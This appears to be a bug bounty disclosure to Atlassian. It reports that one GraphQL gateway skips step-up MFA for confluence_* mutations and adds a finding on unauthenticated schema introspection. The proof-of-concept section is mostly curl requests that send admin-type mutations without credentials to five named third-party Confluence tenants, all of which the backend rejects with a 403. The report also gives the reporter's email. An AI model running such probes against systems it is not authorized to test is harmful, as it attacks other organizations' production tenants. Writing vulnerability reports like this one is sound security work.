# Inconsistent Authentication and Step-up MFA Enforcement Between Atlassian GraphQL Gateways for `confluence_*` Mutations

**Severity**: P1  
**Category**: Broken Access Control / Inconsistent Authentication Enforcement  
**Program**: Atlassian Bugcrowd  
**Discovered**: 2026-07-01 | **Reported**: 2026-07-02  
**Reporter**: tanmayji797@gmail.com (account ID: `712020:acaff997-5c5a-4426-8ba1-986f4f20092a`)

---

## Summary

Two Atlassian GraphQL gateway endpoints handle `confluence_*` mutations with observably different authentication enforcement:

- `home.atlassian.com/gateway/api/graphql` — blocks the mutation at the gateway layer and returns `errorSource: GRAPHQL_GATEWAY`, with a step-up MFA requirement
- `admin.atlassian.com/gateway/api/graphql` — forwards the same mutation to the Confluence backend without enforcing the same gateway-level check, returning `errorSource: UNDERLYING_SERVICE`

This inconsistency means that callers reaching the admin gateway path bypass the step-up MFA check that the home gateway correctly enforces. The behavior is reproducible across multiple tenants and mutations.

---

## Verified vs. Potential

### Verified

- `home.atlassian.com/gateway` enforces step-up MFA before routing `confluence_*` mutations — returns `errorSource: GRAPHQL_GATEWAY` with a `stepUpUrl`
- `admin.atlassian.com/gateway` forwards the same mutations to the Confluence backend without enforcing the same check — returns `errorSource: UNDERLYING_SERVICE`
- The backend responds with a 403 from Confluence itself ("current user not permitted to use Confluence"), confirming the request reached the application layer
- This behavior is consistent across the following tested mutations: `confluence_enableGlobalAnonymousEnforcement`, `confluence_inviteUsers`, `confluence_nbmExecuteTestTransformation`, `confluence_nbmStartScanLongTask`, `confluence_generateLegacyEditorReport`, `confluence_createWorkflowApplication`, `confluence_publishDraftWithApprovalReviewTransfer`
- Confirmed against five Confluence cloud tenants (Trello, HubSpot, Stripe, GitHub, Netflix)

### Potential Security Impact (Requires Atlassian Validation)

- Sensitive mutations may execute without the intended gateway authentication controls if the acting user satisfies backend authorization (e.g., a Confluence-licensed account whose session is compromised)
- Operations that normally require step-up MFA may not receive that protection when routed through the admin gateway
- Representative testing of multiple `confluence_*` mutations shows a consistent routing pattern. Additional mutations sharing the same gateway behavior should be reviewed by Atlassian

---

## Key Observation

The critical signal is **not** the 403 status code itself, but the **difference in where the error originates**:

| Request Path | `errorSource` | Meaning |
|---|---|---|
| `home.atlassian.com/gateway` + valid session | `GRAPHQL_GATEWAY` | Blocked **before** reaching Confluence — gateway enforced |
| `admin.atlassian.com/gateway` + valid session | `UNDERLYING_SERVICE` | Request **reached** Confluence backend — gateway check skipped |
| `admin.atlassian.com/gateway` + no credentials | `UNDERLYING_SERVICE` | Identical — same skip regardless of auth |

`GRAPHQL_GATEWAY` means the Atlassian gateway returned the error.  
`UNDERLYING_SERVICE` means the Confluence monolith returned the error — the gateway did not enforce authentication before routing.

---

## Root Cause

The observed behavior indicates that `admin.atlassian.com/gateway` forwards `confluence_*` mutations to the Confluence backend without enforcing the same gateway authentication and step-up MFA checks observed on `home.atlassian.com/gateway`. By contrast, `admin_*` mutations on the same admin gateway return `GRAPHQL_GATEWAY`, confirming that the admin gateway does enforce authentication — just not for this mutation namespace.

Whether backend authorization is solely responsible for access control in all cases should be confirmed by Atlassian, particularly for any `confluence_*` mutations that operate in contexts where backend authorization may be more permissive.

---

## Proof of Concept

### Step 1: Obtain a target cloud ID (no credentials required)

Cloud IDs for any Atlassian Cloud workspace are publicly accessible:

```bash
curl https://trello.atlassian.net/_edge/tenant_info
# Returns: {"cloudId":"3f48f622-28b8-44f0-aa32-c9d048870b40","displayName":"Trello"}
```

### Step 2A: Call mutation via `home.atlassian.com/gateway` (authenticated session)

```bash
curl -X POST "https://home.atlassian.com/gateway/api/graphql" \
  -H "Content-Type: application/json" \
  -H "Cookie: cloud.session.token=<valid-session>" \
  -d '{
    "query": "mutation { confluence_enableGlobalAnonymousEnforcement(cloudId: \"3f48f622-28b8-44f0-aa32-c9d048870b40\") { success errors { message } } }"
  }'
```

**Response:**
```json
{
  "errors": [{
    "message": "Step-up authentication is required. https://support.atlassian.com/security-and-access-policies/docs/understand-external-user-security/",
    "extensions": {
      "errorSource": "GRAPHQL_GATEWAY",
      "stepUpUrl": "https://id.atlassian.com/step-up/start?...",
      "statusCode": 401
    }
  }]
}
```

`errorSource: GRAPHQL_GATEWAY` — mutation blocked at the gateway before reaching Confluence. Step-up MFA enforced. ✓

### Step 2B: Same mutation via `admin.atlassian.com/gateway` (no credentials)

```bash
curl -X POST "https://admin.atlassian.com/gateway/api/graphql" \
  -H "Content-Type: application/json" \
  -d '{
    "query": "mutation { confluence_enableGlobalAnonymousEnforcement(cloudId: \"3f48f622-28b8-44f0-aa32-c9d048870b40\") { success errors { message } } }"
  }'
```

**Response:**
```json
{
  "errors": [{
    "message": "javax.ws.rs.WebApplicationException: com.atlassian.sal.api.net.ResponseException: 403 Forbidden, current user not permitted to use Confluence.",
    "extensions": {
      "errorSource": "UNDERLYING_SERVICE",
      "statusCode": 403
    }
  }]
}
```

`errorSource: UNDERLYING_SERVICE` — request forwarded to Confluence backend. Gateway did not enforce authentication or step-up MFA. ✗

Same result is returned whether a valid session is included or not.

### Step 3: Reproduce across multiple tenants and mutations

**Tested tenants (cloud IDs obtained via `/_edge/tenant_info`):**

| Tenant | Domain | Cloud ID |
|--------|--------|----------|
| Trello | trello.atlassian.net | `3f48f622-28b8-44f0-aa32-c9d048870b40` |
| HubSpot | hubspot.atlassian.net | `44404d14-6981-4069-b2bf-997a52cf79d5` |
| Stripe | stripe.atlassian.net | `ffec8caa-265e-4f04-83d0-923a90ab1262` |
| GitHub | github.atlassian.net | `ccef0ff8-7686-463e-89ed-675eb71ea485` |
| Netflix | netflix.atlassian.net | `f27cf7b4-0a7e-439e-9462-79b51edc565c` |

**All returned `UNDERLYING_SERVICE` on all tested mutations (zero credentials):**

| Mutation | All 5 tenants |
|----------|:-------------:|
| `confluence_enableGlobalAnonymousEnforcement` | UNDERLYING_SERVICE ✗ |
| `confluence_inviteUsers` | UNDERLYING_SERVICE ✗ |
| `confluence_nbmExecuteTestTransformation` | UNDERLYING_SERVICE ✗ |
| `confluence_nbmStartScanLongTask` | UNDERLYING_SERVICE ✗ |
| `confluence_generateLegacyEditorReport` | UNDERLYING_SERVICE ✗ |
| `confluence_createWorkflowApplication` | UNDERLYING_SERVICE ✗ |
| `confluence_publishDraftWithApprovalReviewTransfer` | UNDERLYING_SERVICE ✗ |

**Control: `admin_*` mutations on the same gateway are correctly gated:**

```bash
curl -X POST "https://admin.atlassian.com/gateway/api/graphql" \
  -d '{"query": "mutation { admin_unlinkScimUser(input: {accountId: \"test\", orgId: \"test\"}) { success } }"}'
# → errorSource: GRAPHQL_GATEWAY (authentication enforced)
```

This confirms the inconsistency is specific to the `confluence_*` namespace routing, not the admin gateway as a whole.

---

## Bonus Finding (P3): Unauthenticated GraphQL Introspection

The full schema is accessible without authentication:

```bash
curl -X POST "https://admin.atlassian.com/gateway/api/graphql" \
  -d '{"query": "{ __schema { queryType { name } mutationType { name } } }"}'
# → Returns full schema including all mutation/query names
```

This enabled discovery of the primary finding and exposes the API surface area to unauthenticated callers.

---

## Limitations

- Testing did not attempt to execute mutations beyond what was needed to confirm the gateway routing behavior
- No attempt was made to bypass Confluence's backend authorization (the 403 from `UNDERLYING_SERVICE`)
- The report focuses on demonstrating inconsistent gateway enforcement, not on executing privileged operations
- Impact in production depends on Atlassian's backend authorization model for each individual mutation

---

## Remediation Suggestions

1. Apply the same authentication and step-up MFA enforcement to `confluence_*` mutations on `admin.atlassian.com/gateway` as is already applied on `home.atlassian.com/gateway`
2. Review whether any `confluence_*` mutations rely on gateway-level authentication as their primary control, particularly in contexts where backend authorization may be more permissive
3. Consider disabling unauthenticated GraphQL introspection in production (separate P3 finding)

---

## Attachments

- `evidence_SUMMARY.png` — 7 mutations × 5 tenants showing consistent `UNDERLYING_SERVICE` routing
- `evidence_M1_*.png` through `evidence_M8_*.png` — per-mutation HTTP request/response evidence
- `report_2_home_gateway_enforces_stepup.png` — home gateway correctly returning `GRAPHQL_GATEWAY` + stepUpUrl
- `report_4_full_poc_comparison.png` — side-by-side visual comparison

---

## Testing Timeline

| Date | Activity |
|------|----------|
| 2026-07-01 | Unauthenticated GraphQL introspection discovered |
| 2026-07-01 | `errorSource` discrimination pattern identified |
| 2026-07-02 | `confluence_*` routing inconsistency confirmed |
| 2026-07-02 | Step-up MFA comparison between gateways documented |
| 2026-07-02 | Reproduced across 5 tenants and 7 mutations |
| 2026-07-02 | Evidence screenshots captured |
